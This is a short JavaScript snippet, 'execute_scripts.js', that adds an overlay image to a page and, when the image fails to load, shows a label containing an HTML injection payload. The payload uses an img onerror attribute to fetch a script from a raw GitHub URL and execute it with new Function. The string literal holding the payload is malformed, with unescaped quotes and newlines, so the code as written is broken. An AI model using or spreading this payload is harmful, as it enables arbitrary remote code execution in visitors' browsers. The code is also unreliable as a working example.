/// execute_scripts.js

(function () {
  const img = document.createElement('img');
  img.src = 'x'; // placeholder — swap this for a real URL

  img.style.cssText = `
    position: fixed;
    bottom: 16px;
    right: 16px;
    width: 48px;
    height: 48px;
    z-index: 999999;
    border-radius: 4px;
  `;

  img.onerror = function () {
    img.remove();

    const label = document.createElement('div');
    label.textContent = '<img src="bad-image.png" onerror="
(async()=>{
  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
  const code = await res.text();
  new Function(code)();
})();
">';
    label.style.cssText = `
      position: fixed;
      bottom: 16px;
      right: 16px;
      z-index: 999999;
      font-size: 16px;
      font-family: sans-serif;
      color: white;
      background: rgba(0,0,0,0.5);
      padding: 4px 8px;
      border-radius: 4px;
    `;
    document.body.appendChild(label);
  };

  document.body.appendChild(img);
})();
